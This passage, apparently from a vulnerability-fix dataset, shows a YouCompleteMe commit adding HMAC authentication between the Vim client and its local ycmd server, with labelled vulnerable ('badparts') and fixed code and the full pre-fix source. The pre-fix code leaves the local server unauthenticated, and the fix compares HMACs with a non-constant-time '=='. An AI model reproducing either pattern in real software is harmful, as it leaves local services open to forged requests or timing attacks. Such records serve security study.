SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http://localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a/python/ycm/server/hmac_plugin.py b/python/ycm/server/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- /dev/null\n+++ b/python/ycm/server/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!/usr/bin/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http://bottlepy.org/docs/dev/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a/python/ycm/server/ycmd.py b/python/ycm/server/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a/python/ycm/server/ycmd.py\n+++ b/python/ycm/server/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a/python/ycm/utils.py b/python/ycm/utils.py\nindex d9128716..095337c9 100644\n--- a/python/ycm/utils.py\n+++ b/python/ycm/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a/python/ycm/youcompleteme.py b/python/ycm/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a/python/ycm/youcompleteme.py\n+++ b/python/ycm/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http://localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "files": {"/python/ycm/client/base_request.py": {"changes": [{"diff": "\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n", "add": 14, "remove": 10, "filename": "/python/ycm/client/base_request.py", "badparts": ["        return BaseRequest.session.post( _BuildUri( handler ),", "                                        data = ToUtf8Json( data ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "        return BaseRequest.session.get( _BuildUri( handler ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "                              data = ToUtf8Json( data ),", "                              headers = _HEADERS )", "                             headers = _HEADERS )"], "goodparts": ["        sent_data = ToUtf8Json( data )", "        return BaseRequest.session.post(", "            _BuildUri( handler ),", "            data = sent_data,", "            headers = BaseRequest._ExtraHeaders( sent_data ),", "            timeout = timeout )", "        return BaseRequest.session.get(", "            _BuildUri( handler ),", "            headers = BaseRequest._ExtraHeaders(),", "            timeout = timeout )", "        sent_data = ToUtf8Json( data )", "                              data = sent_data,", "                              headers = BaseRequest._ExtraHeaders( sent_data ) )", "                             headers = BaseRequest._ExtraHeaders() )"]}, {"diff": "\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ", "add": 3, "remove": 1, "filename": "/python/ycm/client/base_request.py", "badparts": ["    response = requests.get( _BuildUri( 'healthy' ) )"], "goodparts": ["    response = requests.get( _BuildUri( 'healthy' ),", "                             headers = BaseRequest._ExtraHeaders() )", "    _ValidateResponseObject( response )"]}], "source": "\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http://localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http://localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"}, "/python/ycm/youcompleteme.py": {"changes": [{"diff": "\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n", "add": 5, "remove": 3, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    self._temp_options_filename = None", "      self._temp_options_filename = options_file.name", "      json.dump( dict( self._user_options ), options_file )"], "goodparts": ["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )", "      options_dict = dict( self._user_options )", "      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )", "      json.dump( options_dict, options_file )"]}, {"diff": "\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "add": 0, "remove": 1, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    utils.RemoveIfExists( self._temp_options_filename )"], "goodparts": []}], "source": "\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http://localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not 